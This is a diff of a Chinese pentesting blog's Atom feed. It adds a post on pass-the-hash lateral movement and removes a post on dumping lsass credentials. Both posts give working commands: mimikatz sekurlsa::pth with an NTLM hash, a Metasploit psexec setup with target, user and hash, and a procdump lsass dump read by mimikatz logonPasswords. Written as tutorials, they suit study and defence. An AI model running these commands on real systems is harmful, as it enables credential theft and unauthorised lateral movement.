@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-02-02T08:00:37.415Z</updated>
+  <updated>2020-02-03T09:14:01.363Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Hash传递相关知识点</title>
+    <link href="http://yoursite.com/2020/02/03/Hash%E4%BC%A0%E9%80%92%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
+    <id>http://yoursite.com/2020/02/03/Hash传递相关知识点/</id>
+    <published>2020-02-03T07:09:28.000Z</published>
+    <updated>2020-02-03T09:14:01.363Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="PTH介绍"><a href="#PTH介绍" class="headerlink" title="PTH介绍"></a>PTH介绍</h1><p>当我们拿到一台服务器的SYSTEM权限之后，利用工具获取到了服务器的HASH值，但是无法抓取到明文密码或者密文解不开，这个时候我们可以尝试进行Pass The Hash(Hash传递)进行横向的渗透攻击</p><h1 id="利用mimikatz进行pth"><a href="#利用mimikatz进行pth" class="headerlink" title="利用mimikatz进行pth"></a>利用mimikatz进行pth</h1><p><img src="/2020/02/03/Hash传递相关知识点/ntlm.png" alt><br>这里的实验机器是windows server 2012 r2(dc)，发现并没有抓取到明文，这个密文设置的密码也解不出来，注意这里的SID为500.</p><p>然后接着在攻击机器上(在域控中的机器)mimikatz中输入如下的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:domainname /ntlm:519c985a849313d2c8029b293b57de1f</span><br></pre></td></tr></table></figure></p><p>效果是这个样子的，然后他会弹出一个新的cmd窗口<br><img src="/2020/02/03/Hash传递相关知识点/mimikatz.png" alt></p><p>这种方式会感觉有些鸡肋，为什么呢，因为弹出新的cmd窗口，你得登上域内的一台3389才能利用这种方式啊，要是登不上域内的远程桌面，命令行下这种方式不行，就像win10的bypass uac一样，不是很喜欢这种弹出新框框的东西 :)</p><h1 id="利用msf进行pth"><a href="#利用msf进行pth" class="headerlink" title="利用msf进行pth"></a>利用msf进行pth</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.15.181</span><br><span class="line">set SMBUser rabbitmask</span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4</span><br></pre></td></tr></table></figure><p><img src="/2020/02/03/Hash传递相关知识点/msf.png" alt><br>不过这里注意一下HASH的值，mimikatz只需要ntlm就能进行传递，msf的这个模块需要LM:NTLM HASH<br>效果是这个样子的，然后他会弹出一个新的cmd窗口<br><img src="/2020/02/03/Hash传递相关知识点/hash.png" alt><br>就是这个样子的</p><h1 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h1><p>微软在2014年5月份发布的这个KB2871997补丁，禁止了本地管理员账户对远程计算机进行了解，所以我们无法使用psexec、wni、smbexec、schtasks、at等命令对远程主机进行操作，也无法使用PTH方法进行横向渗透，但是唯独SID为500的账号可以使用PTH去横向，这个账号去进行PTH不受到该补丁的影响。</p><p>一般在域环境下SID为500的DC就是域控账号了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;PTH介绍&quot;&gt;&lt;a href=&quot;#PTH介绍&quot; class=&quot;headerlink&quot; title=&quot;PTH介绍&quot;&gt;&lt;/a&gt;PTH介绍&lt;/h1&gt;&lt;p&gt;当我们拿到一台服务器的SYSTEM权限之后，利用工具获取到了服务器的HASH值，但是无法抓取到明文密码或者密文解不开
+      
+    
+    </summary>
+    
+    
+    
+      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH</title>
@@ -445,27 +469,6 @@
     
     
       <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>使用procdump64和mimikatz抓取Windows用户密码</title>
-    <link href="http://yoursite.com/2019/11/08/%E4%BD%BF%E7%94%A8procdump64%E5%92%8Cmimikatz%E6%8A%93%E5%8F%96Windows%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/"/>
-    <id>http://yoursite.com/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/</id>
-    <published>2019-11-08T08:52:49.000Z</published>
-    <updated>2020-01-13T04:49:25.546Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章<br><a id="more"></a><br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/error.png" alt><br>报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</span><br></pre></td></tr></table></figure></p><h1 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h1><p>利用procdump64+mimikatz解决，前提是windows要运行了lsass.exe<br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/lsass.png" alt></p><p>并且命令要在cmd右键管理员身份运行，这里就要bypassuac了，不然运行命令会保存</p><p>lsass.exe用户安全和登陆策略，我们要通过procdump64读取其中的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></p><p>然后用mimikatz读取这个生成的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure></p><p>就成功了</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
